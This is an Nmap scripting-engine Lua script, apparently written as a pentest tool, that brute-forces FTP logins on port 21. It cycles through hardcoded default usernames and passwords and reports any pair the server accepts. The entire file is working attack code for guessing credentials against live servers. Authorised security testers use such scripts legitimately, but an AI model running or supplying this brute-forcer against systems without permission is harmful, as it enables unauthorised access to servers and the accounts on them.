description = [[
    attempts to brute force a FTP server with a list of credentials
]]

author = "Asko7779"
license = "Same as Nmap"
categories = {"brute", "intrusive"}

portrule = function(host, port)
    return port.number == 21 and port.state == "open"
end

action = function(host, port)
    local usernames = {"admin", "root", "guest", "anonymous", "ftp"}
    local passwords = {"admin", "toor", "guest", "1234", "ftp"}

    for _, user in ipairs(usernames) do
        for _, pass in ipairs(passwords) do

            local socket = nmap.new_socket()
            socket:connect(host.ip, port.number)

            socket:send("USER " .. user .. "\r\n")
            socket:receive()
            
            socket:send("PASS " .. pass .. "\r\n")
            local response = socket:receive()
            socket:close()

            if response and response:match("230") then
                return "Valid credentials found: " .. user .. " / " .. pass
            end
        end
    end

    return "[-] Brute force attempt unsuccessful"
end
